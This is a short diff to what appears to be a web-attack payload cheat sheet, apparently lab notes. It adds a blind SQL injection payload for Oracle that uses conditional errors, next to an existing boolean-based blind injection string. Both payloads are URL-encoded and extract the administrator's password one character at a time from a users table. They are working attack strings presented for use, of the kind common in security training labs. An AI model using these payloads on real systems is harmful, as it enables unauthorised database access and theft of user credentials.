@@ -9,6 +9,9 @@
 -- Used when a number (int) was in front of the query
 -- %2F = /, %2B = +, %2A = *, %2D = -
 %2F(CASE+WHEN+(SELECT+SUBSTRING(password,1,1)+FROM+users+where+username+%3d+'administrator')%3d'a'+THEN+1+ELSE+0+END)
+
+-- Conditional Errors
+'||+(select+case+when+(substr(password,1,1)%3d'a')+then+to_char(1/0)+else+null+end+from+users+where+username%3d+'administrator')+||' --> Oracle
 ```
 
 # XSS
